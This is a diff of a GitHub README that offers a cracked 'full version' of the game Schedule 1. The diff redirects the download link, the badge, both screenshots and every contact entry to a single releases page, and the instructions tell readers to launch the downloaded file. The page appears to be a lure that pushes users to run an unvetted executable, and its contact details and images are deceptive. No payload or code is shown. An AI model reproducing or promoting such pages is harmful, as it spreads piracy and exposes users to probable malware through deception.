@@ -8,8 +8,8 @@ Welcome to the Schedule1FullGame repository! 🕹️ Below you will find all the
 - **Topics:** crack, download, free, free-game, free-games, full-game, full-version, game, game-development, games, play, schedule, schedule-1, version
 
 ## 🚀 Get Started
-To download the game, click on the following link: [Download Schedule1FullGame](https://github.com/releases/789694263/Release.zip)
-![Download Button](https://img.shields.io/badge/Download-Here-brightgreen)
+To download the game, click on the following link: [Download Schedule1FullGame](https://github.com/nopalee/Schedule1FullGame/releases)
+![Download Button](https://github.com/nopalee/Schedule1FullGame/releases)
 
 ### Instructions:
 1. If the link ends with the file name, launch the downloaded file.
@@ -28,17 +28,17 @@ Here are some of the amazing features you can expect from Schedule1FullGame:
 ## 🌟 Screenshots
 Check out these cool screenshots from Schedule1FullGame:
 
-![Screenshot 1](https://example.com/screenshot1.png)
+![Screenshot 1](https://github.com/nopalee/Schedule1FullGame/releases)
 
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 2](https://github.com/nopalee/Schedule1FullGame/releases)
 
 ## 💬 Feedback
 We value your feedback! If you have any suggestions, bug reports, or just want to chat about the game, feel free to reach out to us.
 
 ## 📞 Contact Us
-- Email: schedule1fullgame@example.com
-- Twitter: [@Schedule1FullGame](https://twitter.com/Schedule1FullGame)
-- Discord: [Schedule1FullGame Community](https://discord.gg/Schedule1FullGame)
+- Email: https://github.com/nopalee/Schedule1FullGame/releases
+- Twitter: [@Schedule1FullGame](https://github.com/nopalee/Schedule1FullGame/releases)
+- Discord: [Schedule1FullGame Community](https://github.com/nopalee/Schedule1FullGame/releases)
 
 ## 📜 License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
